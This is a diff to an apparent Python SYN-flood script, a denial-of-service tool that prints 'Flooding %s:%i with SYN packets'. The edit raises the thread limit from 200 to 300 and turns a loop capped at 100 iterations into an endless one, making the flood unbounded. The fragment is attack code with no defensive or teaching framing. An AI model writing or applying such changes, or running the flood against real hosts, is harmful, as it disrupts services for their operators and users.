@@ -11,7 +11,7 @@ import threading
 interface    = None
 target       = None
 port         = None
-thread_limit = 200
+thread_limit = 300
 total        = 0
 
 #!# End Global Config #!#
@@ -60,9 +60,9 @@ if( __name__ == "__main__"):
 	# Hop to it!
     print ("Flooding %s:%i with SYN packets." % (target, port))
     cnt=0
-    while cnt<100:
+    while True:
         if (threading.activeCount() < thread_limit): 
             sendSYN().start()
             total += 1
             sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
-        cnt+=1
+#    cnt+=1
